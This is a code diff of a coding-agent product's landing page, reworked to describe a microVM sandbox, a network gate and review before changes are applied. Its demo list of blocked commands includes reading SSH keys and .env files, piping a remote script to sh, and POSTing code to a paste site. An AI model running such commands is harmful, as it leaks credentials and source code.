@@ -18,86 +18,86 @@ const SPLITS: Record<string, [string, string]> = {
   "The engineer drives. Karya assists.": ["The engineer drives. ", "Karya assists."],
   "The harness around the model.": ["The harness around ", "the model."],
 };
-const BIG = ["runs contained", "undo anything", "budgets enforced", "follows you", "no lock-in"];
-const CHAPTERS = ["task", "plan", "read", "edit", "bash", "verify", "report"];
-const TICKER = ["reads run on their own", "edits show a diff and ask", "bash runs in the sandbox", "plan · default · accept-edits", "/undo · /rewind · /redo", "sandbox-exec on macOS", "bubblewrap + seccomp on Linux", "network off by default", "Gemini · Anthropic · OpenAI-compatible", "append-only JSONL sessions", "end-to-end encrypted sync", "--max-cost · --max-steps", "loop detection", "verify before done", "single Go binary", "open source", "pre-1.0"];
+const BIG = ["its own computer", "nothing on your host", "reviewed before it lands", "your keys", "any model"];
+const CHAPTERS = ["task", "vm", "run", "fix", "review", "accept", "report"];
+const TICKER = ["a microVM per session", "nothing runs on your host", "repo copied in, .env left out", "python · read · shell · write_stdin · jobs", "terminal UI and desktop app", "every turn priced", "OpenAI-compatible providers", "a gate on every request out", "an oracle reviews every diff", "git checkpoint before apply", "Linux with KVM · macOS on Apple silicon", "single Go binary", "open source", "pre-1.0"];
 const NODES: [string, string, boolean?][] = [
   ["task", "you", true],
-  ["model", "auto"],
-  ["tool call", "auto"],
-  ["policy", "mode + sandbox"],
-  ["tool result", "auto"],
-  ["model", "auto · next step"],
-  ["verify + report", "files · cost · checks"],
+  ["model", "picks a tool"],
+  ["microVM", "runs it"],
+  ["result", "back to the model"],
+  ["oracle", "reviews the diff"],
+  ["brief", "changes · checks"],
+  ["accept", "you", true],
 ];
 const SEQ = [
-  { n: 0, it: 1, ms: 2000, c: 0, cap: "you: add a --json flag to the list command and make the tests pass" },
-  { n: 1, it: 1, ms: 1400, c: 0.0034, cap: "model streams a plan and requests read cmd/list.go" },
-  { n: 2, it: 1, ms: 1200, c: 0.0034, cap: "tool call: edit cmd/list.go" },
-  { n: 3, it: 1, ms: 2400, c: 0.0034, cap: "policy: an edit in default mode · diff on screen · [a]pprove [d]eny" },
-  { n: 4, it: 1, ms: 1200, c: 0.0095, cap: "tool result: ok · 1 replacement" },
-  { n: 5, it: 1, ms: 1300, c: 0.0095, cap: "model reads the result and runs the tests" },
-  { n: 2, it: 2, ms: 1200, c: 0.0095, cap: "tool call: bash go test ./... · timeout 120s" },
-  { n: 3, it: 2, ms: 1600, c: 0.0095, cap: "policy: sandboxed bash, network off · runs without asking" },
-  { n: 4, it: 2, ms: 1200, c: 0.0129, cap: "tool result: exit 0 · 3.8s" },
-  { n: 5, it: 2, ms: 1200, c: 0.0129, cap: "model answers · no tool requested" },
-  { n: 6, it: 2, ms: 3600, c: 0.02, cap: "verify passed · 1 file changed · in 4,812 · out 1,093 · $0.02 · 41s" },
+  { n: 0, it: 1, ms: 2000, c: 0, cap: "you: fix the failing test in internal/meter and make go test pass" },
+  { n: 1, it: 1, ms: 1400, c: 0.0034, cap: "model plans and calls shell: go test ./internal/meter" },
+  { n: 2, it: 1, ms: 1600, c: 0.0034, cap: "microVM: the test runs on the copy in /workspace · exit 1" },
+  { n: 3, it: 1, ms: 1200, c: 0.0034, cap: "result: the failure goes back to the model" },
+  { n: 1, it: 2, ms: 1300, c: 0.0095, cap: "model fixes sum.go and reruns the tests" },
+  { n: 2, it: 2, ms: 1600, c: 0.0095, cap: "microVM: go test ./... · exit 0" },
+  { n: 3, it: 2, ms: 1200, c: 0.0129, cap: "result: tests pass · the model proposes the diff" },
+  { n: 4, it: 2, ms: 1600, c: 0.02, cap: "oracle: reviews the diff · pass" },
+  { n: 5, it: 2, ms: 1800, c: 0.02, cap: "brief: 1 file changed · tests ran and passed · nothing risky flagged" },
+  { n: 6, it: 2, ms: 3600, c: 0.02, cap: "you press a: git checkpoint, then the diff is applied" },
 ];
 const ROWS: [string, string, string, string, "d" | "p" | "w"][] = [
-  ["root", "/", "", "denied", "d"],
-  ["etc", "├─ etc/  usr/  var/", "", "denied", "d"],
-  ["home", "├─ home/you/", "", "denied", "d"],
-  ["ssh", "│  ├─ .ssh/", "", "denied", "d"],
-  ["cache", "│  ├─ .cache/go-build/", "", "profile go", "p"],
-  ["mod", "│  ├─ go/pkg/mod/", "", "profile go", "p"],
-  ["proj", "│  └─ src/tasks/", "  project root", "writable", "w"],
-  ["tmp", "└─ tmp/karya-7f3a2c/", "  session temp", "writable", "w"],
-  ["net", "⇢ network egress", "  via local proxy", "allowlist only", "d"],
+  ["host", "your machine", "", "not reachable", "d"],
+  ["ssh", "├─ ~/.ssh/", "", "not reachable", "d"],
+  ["env", "└─ ~/dev/billing/.env", "", "not copied in", "d"],
+  ["ws", "/workspace/", "  copy of the repo", "writable", "w"],
+  ["out", "/outputs/", "  docs, charts", "writable", "w"],
+  ["proc", "processes", "  shells, Python, servers", "kept running", "p"],
+  ["net", "⇢ network", "  through the gate", "checked", "d"],
 ];
 const TOOLS: [string, string, boolean, string, string][] = [
-  ["read", "auto", false, "Returns bounded, line-numbered text. offset and limit page through large files.", `read cmd/list.go offset=14 limit=3
-  14 │ cmd := &cobra.Command{Use: "list"}
-  15 │ cmd.RunE = func(c *cobra.Command, …
-  16 │   tasks := store.List()`],
-  ["list · search", "auto", false, "A directory tree and a regex search, both bounded and both respecting .gitignore.", `search "printTable" --context 1
-cmd/list.go:53   return printTable(c.OutOrStdout(), tasks)
-internal/ui/table.go:12  func printTable(w io.Writer, …`],
-  ["write · edit", "asks", true, "A diff before anything changes. old_text must match exactly once, and writes are atomic with permissions kept.", `edit cmd/list.go
+  ["shell · write_stdin", "in the VM", false, "Runs a command in the VM. A command still running after a short wait comes back with a process id; write_stdin reads its output or types into it.", `shell go test ./...
+exit 0 · 3.8s
+ok  github.com/acme/billing/internal/meter`],
+  ["python", "in the VM", false, "A Python session that keeps its state between calls, so the agent loads data once and keeps working with it.", `python df = pd.read_csv("usage.csv")
+       df.units.describe()
+count  18,204  mean 412.6  max 96,310`],
+  ["read · jobs", "in the VM", false, "read for bounded, directed file reads. jobs lists the processes that shell left running.", `jobs
+p3  npm run dev     running  2m10s
+p4  go test -run    exited 0`],
+  ["edit · write", "next", true, "Exact string edits and new files, made in the VM's copy. They reach your repo only through review.", `edit internal/meter/sum.go
 error ambiguous_match  old_text found 2 times
 file left untouched`],
-  ["bash · fetch", "sandboxed", false, "bash runs in the OS sandbox and captures exit code, duration and the tail where errors live. fetch reaches allowlisted domains only.", `exit 1 · 6.2s · timed_out false
-output capped, 48,213 bytes kept at @output/c7
---- FAIL: TestListJSON (0.00s)`],
 ];
-const MODES: [string, string, string, string, string][] = [
-  ["plan", "run", "refused", "run · read-only sandbox", "allowlist"],
-  ["default", "run", "ask, with diff", "run · sandboxed", "allowlist"],
-  ["accept-edits", "run", "run", "run · sandboxed", "allowlist"],
-  ["--no-sandbox", "run", "ask", "ask every time", "ask"],
+const ASKS: [string, string, boolean][] = [
+  ["run commands, install packages", "runs in the VM", false],
+  ["read the web and package registries", "passes the gate if it carries nothing from your repo", false],
+  ["send data somewhere new", "asks you", true],
+  ["bring in more files or another repo", "asks you", true],
+  ["use a real secret", "asks you", true],
+  ["apply changes to your repo", "asks you, after review", true],
 ];
 const PATHS: { name: string; tag: string; us?: boolean; rows: string[] }[] = [
-  { name: "asks for everything", tag: "the cautious agent", rows: ["dozens of prompts", "your machine, once you press y", "git, by hand", "noticed on the bill", "when the model says so"] },
-  { name: "runs on your host", tag: "the yolo agent", rows: ["none", "your whole machine", "git, by hand", "noticed on the bill", "when the model says so"] },
-  { name: "kārya", tag: "contained and undoable", us: true, rows: ["edits only", "the project root and a temp dir", "/undo, bash included", "stopped at your budget", "when your checks pass"] },
+  { name: "runs on your host", tag: "the yolo agent", rows: ["your machine", "your whole machine", "wherever the agent runs", "as soon as they're written", "the vendor's"] },
+  { name: "asks for everything", tag: "the cautious agent", rows: ["your machine, once you press y", "your whole machine", "wherever the agent runs", "one prompt at a time", "the vendor's"] },
+  { name: "runs in their cloud", tag: "the hosted computer", rows: ["someone else's servers", "their VM, away from your repo", "on their servers", "copied back by hand", "one vendor's"] },
+  { name: "kārya", tag: "a computer of its own", us: true, rows: ["a microVM on your machine", "only the VM", "never inside the VM", "after review, with a checkpoint", "any provider, your keys"] },
 ];
-const PATH_ROWS = ["prompts on a typical task", "what a bad command can reach", "undo a bad turn", "a runaway loop's cost", "\"done\" means"];
-const PROVIDERS: [string, boolean][] = [["Gemini", true], ["Anthropic (Claude)", false], ["OpenAI", false], ["OpenRouter", false], ["DeepSeek", false], ["Qwen", false], ["Kimi", false], ["GLM", false], ["Ollama", false], ["vLLM", false], ["LM Studio", false]];
+const PATH_ROWS = ["where commands run", "what a bad command can reach", "your API keys", "changes reach your repo", "models"];
+const PROVIDERS: [string, boolean][] = [["OpenAI", true], ["Amazon Bedrock", true], ["any OpenAI-compatible API", true], ["Gemini", false], ["Anthropic", false]];
 const FAQ: [string, string][] = [
   ["Is Karya free?", "Yes. Karya is open source and you bring your own API keys, so you pay your model provider directly. There is no markup on tokens and no Karya account."],
-  ["Which models can I use?", "Gemini works today. Anthropic and OpenAI-compatible APIs (OpenAI, OpenRouter, DeepSeek, Qwen, Kimi, GLM, Ollama, vLLM, LM Studio) arrive in milestone M4, and you will be able to switch between them mid-session."],
+  ["Which models can I use?", "OpenAI-compatible APIs work today, including OpenAI and Amazon Bedrock, which serves the default model, gpt-oss-120b. Gemini and Anthropic are planned."],
   ["Can I use my Claude or ChatGPT subscription?", "No. Karya uses API keys only. Consumer subscriptions are not resold or proxied."],
-  ["Is the sandbox a security boundary?", "No, and Karya never describes it as one. It limits the damage a mistaken command can do: writes stay in the project, the network is off by default, and .git is read-only. Do not rely on it to contain hostile code."],
-  ["Where does my code go?", "Only to the model provider you choose, as part of the conversation. Sessions are stored on your machine, outside the project, with secrets redacted. Sync is end-to-end encrypted to a target you own."],
-  ["Which platforms are supported?", "macOS (arm64 and x64) and Linux (x64 and arm64), including WSL2. Native Windows comes after launch."],
-  ["Can I use it today?", "You can install the TUI and run the demo or stream from Gemini today. The agent loop, sandbox and undo land over the next milestones; the roadmap shows where each piece is."],
+  ["What does the agent run on?", "A microVM per session, on your machine. Your repo is copied in without .env or key files, and nothing the agent runs touches your host."],
+  ["Where does my code go?", "Into the session's VM on your machine, and to the model provider you choose as part of the conversation. Nothing else."],
+  ["Which platforms are supported?", "Linux with KVM, and macOS on Apple silicon. Karya installs the microVM runtime the first time it starts. Native Windows is not planned for now."],
+  ["Is there a desktop app?", "Yes, an early one: a Tauri app that drives the same Karya core as the terminal UI, with the same chat, tool calls, commands and usage."],
+  ["Can I use it today?", "Yes, built from source: the terminal UI, the desktop app, the microVM and the shell, python and read tools work. Edits, review, the gate and saved sessions come next; the roadmap shows where each piece is."],
 ];
 type Attempt = { cmd: string; res: string; ok: boolean; rows: string[] };
 const ATTEMPTS: Attempt[] = [
-  { cmd: "$ go test ./...", res: "✓ allowed · writes stay in the project root and go cache", ok: true, rows: ["proj", "cache"] },
-  { cmd: "$ curl -fsSL https://get.example.sh | sh", res: "✕ denied · domain not on the allowlist", ok: false, rows: ["net"] },
-  { cmd: "$ echo 'Host *' >> ~/.ssh/config", res: "✕ denied · outside the writable scope", ok: false, rows: ["ssh"] },
-  { cmd: "$ go build -o $TMPDIR/karya-7f3a2c/tasks ./cmd", res: "✓ allowed · session temp dir is writable", ok: true, rows: ["tmp"] },
-  { cmd: "read ../../etc/hosts", res: "✕ rejected · path escapes the project root", ok: false, rows: ["etc"] },
+  { cmd: "$ go test ./...", res: "✓ ran in the VM · writes stay in /workspace", ok: true, rows: ["ws"] },
+  { cmd: "$ cat ~/.ssh/id_ed25519", res: "✕ not found · the VM has no host folders", ok: false, rows: ["ssh"] },
+  { cmd: "$ cat .env", res: "✕ not found · secret files are left out", ok: false, rows: ["env"] },
+  { cmd: "$ curl -X POST paste.example -d @internal", res: "✕ blocked · it carries your code to an unknown site", ok: false, rows: ["net"] },
+  { cmd: "$ python plot_usage.py", res: "✓ chart saved to /outputs · comes back through review", ok: true, rows: ["out"] },
 ];
 
 /* shared class lists (the design's repeated style fragments) */
@@ -357,17 +357,17 @@ export default class Landing extends React.Component<LandingProps, State> {
     const act = this.state.sbActive;
     const e = 1 - Math.pow(1 - this.state.costT, 3);
     const lg = this.state.ledger;
-    const model = this.props.model ?? "gemini-3.5-flash-lite";
+    const model = this.props.model ?? "gpt-oss-120b";
     const termMode = (this.props.animate ?? true) ? "animated" : "final";
     const copyLabel = this.state.copied ? "copied" : "copy";
     const headA = A.slice(0, n);
     const headB = B.slice(0, Math.max(0, n - A.length));
-    const chapterLabel = ch >= 0 ? "chapter " + (ch + 1) + "/7 · " + CHAPTERS[ch] : "one loop · sandboxed commands · one approval";
+    const chapterLabel = ch >= 0 ? "chapter " + (ch + 1) + "/7 · " + CHAPTERS[ch] : "one task · one microVM · one review";
     const ticker = [...TICKER, ...TICKER];
     // alternate filled italic words with outlined upright ones
     const bigTicker = [...BIG, ...BIG].map((text, i) => ({ text, cls: i % 2 ? "text-transparent [-webkit-text-stroke:1.5px_var(--fg-2)] not-italic" : "text-fg [-webkit-text-stroke:0] italic" }));
     const gp = this.state.gatePress;
-    const gateMsg = this.state.gateKey === "a" ? "✓ approved · edit applied · /undo can still take it back" : this.state.gateKey === "d" ? "✕ denied · file untouched · your reason goes to the model" : "› waiting on you · [a]pprove [d]eny";
+    const gateMsg = this.state.gateKey === "a" ? "✓ accepted · checkpoint 3f9a1c taken · diff applied" : this.state.gateKey === "d" ? "✕ declined · your repo is untouched · the fix stays in the VM" : "› waiting on you · [a]ccept [d]ecline";
     const rowOp = (k: number) => (lg >= k ? "opacity-100" : "opacity-10");
 
     return (
@@ -409,11 +409,7 @@ export default class Landing extends React.Component<LandingProps, State> {
               </Link>
             </div>
             <div data-reveal className="mt-[72px] border border-line-2 bg-bg-2 p-[clamp(12px,2.4vw,32px)] mobile:mt-11 mobile:p-[10px]">
-              <div className="mb-[22px] flex flex-wrap justify-between gap-x-4 gap-y-[6px] font-mono text-[12px] text-fg-3 mobile:mb-4 mobile:text-[11px]">
-                <span className="flex items-center gap-2">
-                  <span className="inline-block h-2 w-2 bg-accent" />
-                  demo · when it asks, press <span className="border border-accent px-[6px] py-0 text-accent">a</span> or <span className="border border-fg-3 px-[6px] py-0 text-fg-2">d</span>
-                </span>
+              <div className="mb-[22px] flex flex-wrap justify-end gap-x-4 gap-y-[6px] font-mono text-[12px] text-fg-3 mobile:mb-4 mobile:text-[11px]">
                 <span>{chapterLabel}</span>
               </div>
               <Terminal mode={termMode} model={model} interactive onChapter={this.onChapter} />
@@ -458,8 +454,8 @@ export default class Landing extends React.Component<LandingProps, State> {
             <h2 data-reveal className={`${h2} ${h2m} max-w-[18ch]`}>
               Babysit it, or <em className={em}>hope for the best.</em>
             </h2>
-            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>Most coding agents make you pick one. Approve every command and you spend the afternoon pressing y. Skip the prompts and a stray command runs on your real machine. Karya takes a third path: let it run, inside walls, with a way back.</p>
-            <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,280px),1fr))] gap-4">
+            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>Agents either run on your machine, one bad command away from damage, or ask so often that nobody reads the prompts. The ones with a computer of their own run in someone else's cloud, on one vendor's models, away from your repo. Karya gives the agent its own computer on your machine, and makes everything that leaves it pass a check.</p>
+            <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,240px),1fr))] gap-4">
               {PATHS.map((pth) => (
                 <div key={pth.name} data-reveal className={`flex flex-col border ${pth.us ? "border-accent bg-bg-2" : "border-line-2 bg-transparent"}`}>
                   <div className="border-b border-line px-[18px] py-4">
@@ -485,10 +481,10 @@ export default class Landing extends React.Component<LandingProps, State> {
         <section className="border-b border-line">
           <div className="mx-auto my-0 grid max-w-[1100px] grid-cols-[repeat(auto-fit,minmax(200px,1fr))] gap-x-7 gap-y-12 px-6 py-[clamp(56px,8vw,104px)] mobile:grid-cols-[repeat(2,minmax(0,1fr))] mobile:gap-x-5 mobile:gap-y-8 mobile:px-5 mobile:py-12">
             {[
-              ["7", "tools · read, list, search, write, edit, bash, fetch", false],
-              ["3", "modes · plan, default, accept-edits", false],
-              ["1", "provider interface · Gemini, Anthropic, OpenAI-compatible", false],
-              ["1", "Go binary · go install and run", true],
+              ["1", "microVM per session · started with it, thrown away after", false],
+              ["0", "agent commands run on your host", false],
+              ["5", "tools today · python, read, shell, write_stdin, jobs", false],
+              ["2", "clients · terminal UI and desktop app", true],
             ].map(([num, cap, accent], i) => (
               <div key={i} data-reveal className="flex flex-col gap-[14px]">
                 <div className={`font-serif text-[clamp(88px,11vw,148px)] leading-[0.85] tracking-[-0.05em] mobile:text-[64px] ${accent ? "text-accent" : ""}`}>{num as string}</div>
@@ -502,11 +498,11 @@ export default class Landing extends React.Component<LandingProps, State> {
         <section className="border-t border-line">
           <div className="mx-auto my-0 grid max-w-[1100px] grid-cols-[repeat(auto-fit,minmax(180px,1fr))] gap-x-7 gap-y-8 px-6 py-12 mobile:gap-x-5 mobile:gap-y-[22px] mobile:px-5 mobile:py-9">
             {[
-              ["#sandbox", "01", "Contained, not interrogated", "Shell commands run in the OS sandbox without asking. Edits show a diff."],
-              ["#undo", "02", "Every turn can be undone", "/undo restores the tree, including what bash changed."],
-              ["#cost", "03", "Cost you can predict", "Hard budgets, loop detection and a report for every task."],
-              ["#sessions", "04", "Sessions that follow you", "Resume on any machine. Sync is end-to-end encrypted."],
-              ["#lockin", "05", "No lock-in", "One provider interface. Switch models mid-session."],
+              ["#vm", "01", "A computer of its own", "Every command runs in the session's microVM, never on your machine."],
+              ["#review", "02", "Reviewed before it lands", "Diffs are reviewed, then applied only when you accept."],
+              ["#cost", "03", "Cost you can see", "Every turn is priced. Hard limits come next."],
+              ["#secrets", "04", "Your keys stay out", "The VM holds placeholders. A gate checks every request out."],
+              ["#models", "05", "Any model, your keys", "OpenAI-compatible today, more providers next."],
             ].map(([href, num, title, sub]) => (
               <a key={href} href={href} className="flex flex-col gap-2 text-fg no-underline">
                 <span className="font-mono text-[12.5px] text-fg-3">{num}</span>
@@ -521,12 +517,12 @@ export default class Landing extends React.Component<LandingProps, State> {
         <section id="loop" className="border-t border-line">
           <div className={sectionPad}>
             <div data-reveal className={label}>the loop</div>
-            <h2 data-reveal className={`${h2} ${h2m} max-w-[20ch]`}>One sequential loop, one step at a time.</h2>
-            <p data-reveal className={`${lead} m-0 max-w-[62ch]`}>Karya keeps one model request in flight per session, and tool calls run one at a time in the order the model asked. Each call passes through the mode and the sandbox: reads and sandboxed commands run, edits in default mode wait for you. When the model stops asking for tools, your repo's checks run, and only then is the task reported done.</p>
+            <h2 data-reveal className={`${h2} ${h2m} max-w-[20ch]`}>The model works freely. The edges are checked.</h2>
+            <p data-reveal className={`${lead} m-0 max-w-[62ch]`}>Karya runs one turn at a time. Each tool call the model asks for runs inside the session's microVM, and the result goes straight back to the model, with no prompt in between. The checks sit at the edges: when the work is done, an oracle reviews the diff, you get a brief, and only your answer applies it.</p>
             <div data-reveal className="mt-14 border border-line-2 p-[clamp(18px,3vw,36px)] mobile:mt-9 mobile:px-[14px] mobile:py-4">
               <div className="mb-7 flex flex-wrap justify-between gap-x-4 gap-y-[6px] font-mono text-[12.5px] text-fg-3">
                 <span>
-                  iteration {step.it} · step {this.state.loopI + 1} of 11
+                  iteration {step.it} · step {this.state.loopI + 1} of {SEQ.length}
                 </span>
                 <span>est. ${step.c.toFixed(4)}</span>
               </div>
@@ -559,14 +555,13 @@ export default class Landing extends React.Component<LandingProps, State> {
                 <span>{step.cap}</span>
               </div>
             </div>
-            <div className="mt-4 font-mono text-[12.5px] text-fg-3">↺ model → tool call → policy → result repeats until the model answers or a limit is hit · failed checks go back to the model</div>
+            <div className="mt-4 font-mono text-[12.5px] text-fg-3">↺ model → microVM → result repeats until the model answers · review, brief and accept are planned</div>
             <div className="mt-9 flex flex-wrap items-center gap-[10px] border-t border-line pt-5 font-mono text-[12.5px]">
-              <span className="mr-2 text-fg-3">exits on</span>
-              <span className={pill}>verified answer</span>
-              <span className={pill}>max steps</span>
-              <span className={pill}>max cost</span>
-              <span className={pill}>loop detected</span>
-              <span className={pill}>interrupted</span>
+              <span className="mr-2 text-fg-3">you are asked only for</span>
+              <span className={pill}>more files or repos</span>
+              <span className={pill}>new network writes</span>
+              <span className={pill}>real secrets</span>
+              <span className={pill}>applying changes</span>
               <span className="ml-auto flex gap-[18px] text-fg-3">
                 <span>
                   <span className="mr-[6px] inline-block h-[10px] w-[10px] border border-line-2 align-[-1px]" />
@@ -574,7 +569,7 @@ export default class Landing extends React.Component<LandingProps, State> {
                 </span>
                 <span>
                   <span className="mr-[6px] inline-block h-[10px] w-[10px] border border-dashed border-accent align-[-1px]" />
-                  waits on you (edits in default mode)
+                  you
                 </span>
               </span>
             </div>
@@ -587,9 +582,9 @@ export default class Landing extends React.Component<LandingProps, State> {
             <div>
               <div className="font-mono text-[13px]">the one prompt that matters</div>
               <h2 className="mt-5 mb-7 max-w-[11ch] font-serif text-[clamp(48px,7.4vw,108px)] leading-[0.95] font-normal tracking-[-0.04em] mobile:text-[44px]">
-                Your files change when you press <em>a</em>.
+                Your repo changes when you press <em>a</em>.
               </h2>
-              <p className="m-0 max-w-[42ch] font-serif text-[21px] leading-[1.5] text-pretty mobile:text-[18px]">In default mode, write and edit show a unified diff and wait. Commands don't ask: they run in the sandbox, and anything that tries to leave it always asks. Try it: press a or d on your keyboard, or click a key.</p>
+              <p className="m-0 max-w-[42ch] font-serif text-[21px] leading-[1.5] text-pretty mobile:text-[18px]">The agent works on a copy of your repo inside its VM. Until you accept, git status on your machine shows nothing changed. Then Karya takes a git checkpoint and applies the diff. Try it: press a or d on your keyboard, or click a key.</p>
             </div>
             <div className="flex flex-col items-start gap-9">
               <div className="flex flex-wrap gap-7">
@@ -597,36 +592,37 @@ export default class Landing extends React.Component<LandingProps, State> {
                   <button
                     key={k}
                     onClick={() => this.pressGate(k)}
-                    aria-label={k === "a" ? "approve" : "deny"}
+                    aria-label={k === "a" ? "accept" : "decline"}
                     className={`flex h-[clamp(128px,14vw,176px)] w-[clamp(128px,14vw,176px)] cursor-pointer flex-col items-start justify-between border-2 border-accent-ink bg-transparent px-[18px] py-4 text-left text-accent-ink [transition:transform_.09s,box-shadow_.09s] hover:bg-accent-ink hover:text-accent ${
                       gp === k ? "[box-shadow:0_0px_0_var(--accent-ink)] [transform:translateY(10px)]" : "[box-shadow:0_10px_0_var(--accent-ink)] [transform:translateY(0px)]"
                     }`}
                   >
                     <span className="font-mono text-[clamp(56px,6vw,80px)] leading-none font-medium">{k}</span>
-                    <span className="font-mono text-[13px]">{k === "a" ? "approve" : "deny"}</span>
+                    <span className="font-mono text-[13px]">{k === "a" ? "accept" : "decline"}</span>
                   </button>
                 ))}
               </div>
               <div className="box-border flex w-full flex-col gap-1 border-2 border-accent-ink px-4 py-[14px] font-mono text-[14px] leading-[1.6]">
-                <span>edit cmd/list.go · +5 −0</span>
+                <span>proposal internal/meter/sum.go · +1 −1 · oracle passed</span>
                 <span className="font-semibold">{gateMsg}</span>
               </div>
             </div>
           </div>
         </section>
 
-        {/* real tui */}
+        {/* real clients */}
         <section id="today" className="border-t border-line">
           <div className={sectionPad}>
             <div data-reveal className={label}>try it today</div>
             <h2 data-reveal className={`${h2} ${h2m} max-w-[18ch]`}>
-              The terminal UI is real. <em className={em}>Take it for a spin.</em>
+              Terminal or desktop. <em className={em}>Same core.</em>
             </h2>
-            <p data-reveal className={`${lead} mt-0 mb-7 max-w-[62ch]`}>The agent is still being built, but the TUI already runs: side-by-side diffs, threads, @ file mentions, ! shell commands, $EDITOR prompts and queued messages. The demo needs no API key.</p>
-            <pre data-reveal className="mt-0 mb-10 inline-block max-w-full overflow-x-auto border border-accent bg-bg-2 px-[18px] py-3 font-mono text-[14px] leading-[1.8] mobile:text-[12.5px] mobile:whitespace-pre-wrap mobile:[overflow-wrap:break-word]">
+            <p data-reveal className={`${lead} mt-0 mb-7 max-w-[62ch]`}>The terminal UI and an early desktop app both drive the same Karya core. Each session already gets its own microVM with your repo copied in, minus .env and key files, and every turn shows its tokens and cost. Edits, review and the gate come next.</p>
+            <pre data-reveal className="mt-0 mb-4 inline-block max-w-full overflow-x-auto border border-accent bg-bg-2 px-[18px] py-3 font-mono text-[14px] leading-[1.8] mobile:text-[12.5px] mobile:whitespace-pre-wrap mobile:[overflow-wrap:break-word]">
               <span className="text-accent">$</span> {INSTALL.split("/").map((part, k) => (k ? <React.Fragment key={k}>/<wbr />{part}</React.Fragment> : part))}{"\n"}
-              <span className="text-accent">$</span> karya -demo
+              <span className="text-accent">$</span> karya
             </pre>
+            <p data-reveal className="mt-0 mb-10 font-mono text-[12.5px] text-fg-3">needs Linux with KVM or macOS on Apple silicon, and an OpenAI or Amazon Bedrock key</p>
             <div data-reveal>
               <TuiFrame />
             </div>
@@ -637,13 +633,13 @@ export default class Landing extends React.Component<LandingProps, State> {
         <section id="anatomy" className="border-t border-line">
           <div className={sectionPad}>
             <div data-reveal className={label}>anatomy of a harness</div>
-            <h2 data-reveal className={`${h2} mt-[18px] mb-12 max-w-[22ch]`}>The model is the brain. The harness is everything around it.</h2>
+            <h2 data-reveal className={`${h2} mt-[18px] mb-12 max-w-[22ch]`}>The model is not limited. The place it works in is made safe.</h2>
             <div className="grid grid-cols-[repeat(auto-fit,minmax(220px,1fr))] gap-x-8 gap-y-9">
               {[
-                ["drives model and tool calls", "Streams text and assembles tool-call deltas as they arrive. One in-flight request per session."],
-                ["manages state and context", "Canonical messages. Tool output is capped with the full copy kept readable. Compaction near the context limit is visible, and every turn goes to a JSONL log."],
-                ["applies policy", "Three modes, the OS sandbox around shell commands, a network allowlist, and file paths confined to the project root."],
-                ["keeps the task moving", "A sequential loop that runs until your checks pass or a limit is reached. Steer it mid-turn without interrupting."],
+                ["drives the model and tools", "Streams the model's reply, runs its tool calls one at a time, and prices every turn."],
+                ["owns the computer", "A microVM per session: the repo copied in, a Python session, and shells and servers that keep running between calls."],
+                ["controls every crossing", "Network traffic leaves through the gate, outputs come back through review, and real keys are added only on the way to their host."],
+                ["shows everything", "Every action the agent takes is one line you can read. Done means the checks passed, not that the model said so."],
               ].map(([t, d]) => (
                 <div key={t} data-reveal className="flex flex-col gap-3 border-t border-fg-3 pt-[18px]">
                   <div className="font-mono text-[13px]">{t}</div>
@@ -654,20 +650,20 @@ export default class Landing extends React.Component<LandingProps, State> {
           </div>
         </section>
 
-        {/* modes and tools */}
+        {/* tools */}
         <section id="tools" className="border-t border-line">
           <div className={sectionPad}>
-            <div data-reveal className={label}>modes and tools</div>
+            <div data-reveal className={label}>tools</div>
             <h2 data-reveal className={`${h2} ${h2m} max-w-[20ch]`}>
-              Seven tools. Only edits <em className={em}>ask.</em>
+              A real computer, <em className={em}>not a cut-down tool list.</em>
             </h2>
-            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>Reads, searches and sandboxed commands run on their own. write and edit show a unified diff and wait. Anything that tries to leave the sandbox, like an unsandboxed run or a domain off the allowlist, always asks. shift+tab cycles the mode.</p>
+            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>Nothing is taken away from the model to make it safe. It can install packages, run servers, analyse data and write code, because all of it happens inside the VM. These are the tools it has today, and the next ones.</p>
             <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,420px),1fr))] gap-px border border-line bg-line">
-              {TOOLS.map(([name, badge, asks, d, ex]) => (
+              {TOOLS.map(([name, badge, next, d, ex]) => (
                 <div key={name} data-reveal className={toolCard}>
                   <div className={toolHead}>
                     <span className="text-[30px] font-medium mobile:text-[24px]">{name}</span>
-                    <span className={`border px-2 py-[2px] text-[12px] ${asks ? "border-accent text-accent" : "border-line-2 text-fg-2"}`}>{badge}</span>
+                    <span className={`border px-2 py-[2px] text-[12px] ${next ? "border-accent text-accent" : "border-line-2 text-fg-2"}`}>{badge}</span>
                   </div>
                   <div className={toolDesc}>{d}</div>
                   <pre className={toolPre}>{ex}</pre>
@@ -678,60 +674,44 @@ export default class Landing extends React.Component<LandingProps, State> {
               <table className="w-full border-collapse text-left font-mono text-[13px] whitespace-nowrap">
                 <thead>
                   <tr className="text-fg-3">
-                    <th className={thFirst}>mode</th>
-                    <th className={th}>read · list · search</th>
-                    <th className={th}>write · edit</th>
-                    <th className={th}>bash</th>
-                    <th className={thLast}>fetch</th>
+                    <th className={thFirst}>when the agent wants to</th>
+                    <th className={thLast}>what happens</th>
                   </tr>
                 </thead>
                 <tbody>
-                  {MODES.map(([m, r, w, b, f]) => (
-                    <tr key={m} className="border-t border-line">
-                      <td className={`${tdFirst} font-medium`}>{m}</td>
-                      <td className={`${td} text-fg-2`}>{r}</td>
-                      <td className={`${td} ${w.startsWith("ask") ? "text-accent" : "text-fg-2"}`}>{w}</td>
-                      <td className={`${td} ${b.startsWith("ask") ? "text-accent" : "text-fg-2"}`}>{b}</td>
-                      <td className={`${tdLast} ${f === "ask" ? "text-accent" : "text-fg-2"}`}>{f}</td>
+                  {ASKS.map(([what, how, asks]) => (
+                    <tr key={what} className="border-t border-line">
+                      <td className={`${tdFirst} font-medium`}>{what}</td>
+                      <td className={`${tdLast} ${asks ? "text-accent" : "text-fg-2"}`}>{how}</td>
                     </tr>
                   ))}
                 </tbody>
               </table>
             </div>
-            <div className="mt-16 grid grid-cols-[repeat(auto-fit,minmax(min(100%,340px),1fr))] items-start gap-x-12 gap-y-8">
-              <div>
-                <h3 className="mt-0 mb-[14px] font-serif text-[28px] leading-[1.2] font-normal">A denial is information.</h3>
